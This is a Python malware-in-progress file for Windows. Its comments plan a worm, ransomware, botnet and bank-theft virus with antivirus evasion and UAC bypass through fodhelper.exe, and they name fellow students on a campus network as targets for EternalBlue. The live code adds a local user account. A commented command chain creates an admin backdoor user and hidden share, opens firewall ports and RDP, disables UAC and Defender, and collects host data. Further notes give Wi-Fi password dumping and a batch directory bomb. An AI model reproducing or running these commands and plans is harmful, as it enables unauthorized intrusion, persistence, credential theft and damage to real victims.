 # coding: utf-8
'''
	Designed By : 
 █     █░ ██▓ ██▓    ▓█████▄  ▒█████   ███▄    █  ██▓ ▒█████   ███▄    █ 
▓█░ █ ░█░▓██▒▓██▒    ▒██▀ ██▌▒██▒  ██▒ ██ ▀█   █ ▓██▒▒██▒  ██▒ ██ ▀█   █ 
▒█░ █ ░█ ▒██▒▒██░    ░██   █▌▒██░  ██▒▓██  ▀█ ██▒▒██▒▒██░  ██▒▓██  ▀█ ██▒
░█░ █ ░█ ░██░▒██░    ░▓█▄   ▌▒██   ██░▓██▒  ▐▌██▒░██░▒██   ██░▓██▒  ▐▌██▒
░░██▒██▓ ░██░░██████▒░▒████▓ ░ ████▓▒░▒██░   ▓██░░██░░ ████▓▒░▒██░   ▓██
	cRi3d on windows 10 using trusted binaries >> by cL34n 3v3RytH!n9
'''
# TODO: build smt like stuxnet/a static virus in which it'll do its job without a backward connection to the server; also create a virus like a complicated virus which i'll change its memory address to bypass AVs like task manager viruses it can also hide itself in task manager which are backdoor but they'll slow the RAM and other fucking parts => polymorphic viruses
# TODO: complete this virus in assembly to generate the shellcode and inject that shellcode through a complicated way into memory(python ctypes lib)
# TODO: create ur bypass algorithm in such way that AVs can't detect it => signature changing or other methods like stay hide in memory!
# TODO: turn this file into exe using pyinstaller then use upx packer to compress or expand executable file
# TODO: use Exploiting\Shell\SPsheLLcodeInJeCtIoN\README.txt exploiting section to complete this project
# TODO: make it persistence by registering a key
# TODO: change this code into a botnet to do the job itself
# TODO: spread a virus for banks in such a way that it can transfer money from one account into another account randomly 
# TODO: turn this virus into a ransomware
# TODO: upload my virus on github
# TODO: doing an open port on target machine
# TODO: test fodhelper.exe vuln in metasploit also and make exploit from this virus to use it in metaslpoit in post exploitation tools or create shellcode from it in advanced concepts
# TODO: spread ur virus in whole netwrok(whole networking concept & how we can get internet and vpn by ourself)....send it using socket programming or using mitm or using SE or using HIDs or C&C bot
# TODO: pack this shit(Common Binary Executables: exe , dll , msi) to bypass anti-viruses like assembly shellcode injection ops - make exploit from this project to pack it nicely! - paste my pack on startup folder to run it every time the os is shutting up  
# TODO: run itself automatically in target machie for the first time and spread itself in whole network then make itself persistence to always be in there till victim decide to change the os
# TODO: virus must destroy itself after infecting process and all remain is a binary or dll code to run itself for later on; clean your activity, stay anonymous!
# TODO: work with regkey to delegate any kind of virus to be executed on the users behalf without any consent(winreg lib) => create exploit for every flaw of windows using dll concept
# TODO: find others flaw like fodhelper.exe and bypass other things in windows
# TODO: spread and build this virus like eternal blue exploit and its spread way 
# KEEP-IN-MIND: if one day the fodhelper is gone then use the ctypes lib for administrator privilages
# KEEP-IN-MIND: spread it with HID(rebuild the script in aide to make it suite for teensy or use sdcard on top of teensy)
# KEEP-IN-MIND: spread it using SE(using flash memory)
# KEEP-IN-MIND: spread it using C&C bot
# KEEP-IN-MIND: how spread a virus through open ports(below links)
# KEEP-IN-MIND: spread it with networking concepts(mitm, sniffing, email, open ports, socket programming,...)
# KEEP-IN-MIND: spread it totally with SOCKET PROGRAMMING >> MSF BACKDOOR-SHELLCODE-VIRUS INJECTION >> C&C BACKDOOR TELBOT & HIDs PAYLOAD
# KEEP-IN-MIND: use this code for MAN project and build it as a bot to do the job itself; spread itself in whole network
# KEEP-IN-MIND: think about turning your codes into a botnet like C&C bot
# KEEP-IN-MIND: MSF BACKDOOR-SHELLCODE-VIRUS INJECTION >> build this code in such a way that it can spread using msf post exploitation modules
# KEEP-IN-MIND: build shellcode from this code like using assembly and C concepts
# KEEP-IN-MIND: use youtube videos to get what u want => search about what u want
# KEEP-IN-MIND: hack through open ports using nmap NSE feature for sending shellcodes viruses botnets and exploits
# KEEP-IN-MIND: use rop concept and its lib with ctypes for exploiting
# KEEP-IN-MIND: An Exploit is a vulnerability in a code. Then an Exploit is how, or the entry way for, the Malware to enter your computer; use exploit to enter this virus target computer
# KEEP-IN-MIND: use binary exploits shellcodes to inject malware into memory
# KEEP-IN-MIND: More secure socket connection using SSL
# KEEP-IN-NIND: scan open ports and send or spread itself using ssl socket through that port with s.send() method 
# KEEP-IN-NIND: instead of this file u can use ur backdoor to hid it behind the fodhelper.exe privilages


# https://www.youtube.com/watch?v=1drBqXG2jg0
# http://shell-storm.org/shellcode/
# https://thehackernews.com/2018/07/windows-adobe-zero-exploit.html
# http://diversenetinc.com/several-common-ways-network-viruses-spread/
# https://stackoverflow.com/questions/6287918/how-to-decompile-an-exe-file-compiled-by-py2exe
# https://www.esentire.com/blog/cyber-threats-101-how-to-prevent-file-based-malware-and-botnets/
# https://security.stackexchange.com/questions/49320/difference-between-binary-exploitation-and-reverse-engineering
# https://opensourceforu.com/2015/12/the-basics-of-binary-exploitation/
# https://hackernoon.com/binary-exploitation-eli5-part-1-9bc23855a3d8
# https://www.youtube.com/watch?v=akCce7vSSfw
# https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/
# https://newtecservices.com/malware-exploit-attacks-explained/
# https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/
# https://dzone.com/articles/bypassing-windows-10-uac-withnbsppython
# http://nullege.com/codes/show/src@t@r@TrustRouter-HEAD@client@packaging@Windows@Python32@Lib@site-packages@win32comext@shell@demos@servers@shell_view.py/838/winreg.DeleteKey
# https://en.wikipedia.org/wiki/Windows_Registry
# https://www.howtogeek.com/131961/how-to-access-windows-remote-desktop-over-the-internet/
# https://github.com/api0cradle/UltimateAppLockerByPassList
# https://technet.microsoft.com/en-us/library/2009.07.uac.aspx
# https://github.com/api0cradle/LOLBAS/blob/master/LOLBins.md
# https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/
# https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
# https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/
# https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
# https://www.cisecurity.org/top-10-malware-january-2018/
# https://heimdalsecurity.com/blog/security-alert-cryptolocker-package-not-one-waiting/
# https://thehackernews.com/2018/05/hard-drive-failure-hack.html
# https://www.acunetix.com/blog/articles/danger-open-ports-trojan-trojan/
# https://lifehacker.com/198946/how-to-portscan-your-computer-for-security-holes
# https://security.stackexchange.com/questions/159331/how-is-the-wannacry-malware-spreading-and-how-should-users-defend-themselves-f
# https://helpdeskgeek.com/networking/determine-open-and-blocked-ports/
# https://www.lifewire.com/port-knocking-2486700
# https://null-byte.wonderhowto.com/forum/help-spreading-payload-virus-through-wifi-by-just-inserting-usb-stick-0154745/
# https://superuser.com/questions/719594/how-do-worms-spread-across-networks
# https://www.symantec.com/connect/articles/best-practice-avoid-spread-virus-infection-network
# https://www.wilderssecurity.com/threads/how-to-stop-malware-from-spreading-in-network.285655/
# https://community.sophos.com/kb/en-us/124699
# https://www.lifewire.com/port-knocking-2486700
# https://github.com/Voulnet/CVE-2017-8759-Exploit-sample
# https://github.com/Eugnis/spectre-attack
# https://github.com/RPISEC/MBE
# https://www.wired.com/2015/04/hacker-lexicon-spear-phishing/
# https://www.youtube.com/watch?v=RJHPGYz2lA4
# https://www.youtube.com/watch?v=OU0Ar2LeSgU
# https://social.technet.microsoft.com/Forums/lync/en-US/08ce6e3a-4a42-434a-b4d0-524a599e5147/remote-desktop-only-works-through-lan-connection?forum=winserverTS

'''
use shellcodes and binary exploits to inject malware into memory
think about whole hacking and jabing using ANN ML DL => use AI in whole jabing and hacking like create botnet using AI for baseband and bts ops
nuttering on Gyoithon(github.com/gyoisamurai/GyoiThon) and https://github.com/cchio/deep-pwning => create hacking script and penjabing tools like viruses shellcodes malwares using ANN ML DL
how to spread a virus using ports in both networking and usb ports like printers
jab on umz student on LAN without sending them anything at aquarium using msf LAN modules like eternal blue => https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit ; it use a vuln in SMB port
jab on umz student at aquarium and dormitory studing room using all tricks that u learned so far on WAN & LAN
use fodhelper.exe to show a random message on terminal using admin cmd with startup feature
this script is a scraping tools to scrap all the things in MAN system; scraping bot with my C&C server but not a RAT
test fodhelper.exe in msf post exploitation and other modules to do smt like upload files and bypass uac through meterpreter + update lazy and backdoor attack with it
'''



'''
net start wlansvc && netsh wlan show profiles && netsh wlan show profiles PROFILENAME key=clear => play with network configuration using netsh
shutdown system
crashing Windows on a laptop using malicious audio over its built-in speaker
make system slower by burning cpu in first seconds of infecting process
encrypt files and drivers and then remove other info in other dreives
:top 
md %random% 
goto top 
get all info about wifi like password auth
infinite loop to damage to hardware with persistence feature
do all this things with ur C&C bot or use ur C&C bot to spread the virus
make a spreading pattern or algorithm from scratch
scan drives + BSOD page(take the screen on blue screen)
copy itself in startup folder
encrypting algorithm for virus license like meterpreter shell; only works with my sign
all about windows APIs and its registry system
bind this virus on image or anything or a setup file
scan ports related to devices like other usb ports to copy itself on other usb sticks
add scan open ports feature to scan all ports in target machine
change date and time of the system; cause the time of the server is very important rule for os(planing an attack according to the time of the os)
find other vulns in windows and write attack function against them && mass with windows defender
test remote desktop on wan so it'll forward the port 3389 then its waiting for connection from attacker so the attacker must install ngrok on victims machine and connect to NGROK_PORT on his own machine with ngrok_PUBLIC_IP  
===> victims forward port 3389 with ngrok then attacker use NGROK_PORT to connect to victims machine => use reverse proxy for remote desktop
'''





import os, ctypes, sys
# os.system("net user W%computername%O vocfu1203 /add && net localgroup administrators W%computername%O /add && mkdir C:\system-01 && cd system-01 && attrib system-01 +h && net share trojan-share$=C:\system-01 /grant:WO,full /grant:everyone,full && netsh firewall set service type = fileandprint mode = enable && netsh firewall set service type = remotedesktop mode = enable && netsh advfirewall firewall set rule group='remote desktop' new enable=Yes && netsh advfirewall firewall add rule name='Open Ports' dir=out action=allow protocol=TCP localport=8080-445-443-6777-3389 && reg add 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections/t REG_DWORD /d0/f && netsh advfirewall set allprofile state off && reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f && ipconfig /all > C:\system-01\%computername%.txt && getmac > C:\system-01\%computername%.txt && net user > C:\system-01\%computername%.txt && powershell.exe set-executionpolicy remotesigned && powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true")
os.system("net user W%computername%O 1234 /add")
# ctypes.windll.shell32.ShellExecuteW(None, "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true", unicode(sys.executable), unicode(__file__), None, 1)